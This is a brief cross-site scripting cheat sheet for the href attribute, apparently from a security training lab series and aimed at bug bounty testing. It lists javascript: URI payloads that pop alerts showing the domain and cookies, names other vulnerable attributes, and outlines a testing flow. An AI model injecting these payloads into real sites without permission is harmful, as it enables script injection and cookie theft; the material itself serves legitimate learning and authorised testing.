# href JavaScript CheatSheet

## Dangerous Context

```html
<a href="USER_INPUT">
```

---

# Basic Payload

```javascript
javascript:alert(1)
```

---

# Document Domain

```javascript
javascript:alert(document.domain)
```

---

# Cookie Test

```javascript
javascript:alert(document.cookie)
```

---

# Common Vulnerable Attributes

```html
href
src
action
formaction
```

---

# Related Lab

```text
Lab16
```

---

# Testing Methodology

```text
Input Controls URL?
        ↓
Try javascript:
        ↓
Click Link
        ↓
Execution
```

---

# Bug Bounty Reminder

Always check:

```text
Protocol Validation
```

Many applications validate domains but forget protocols.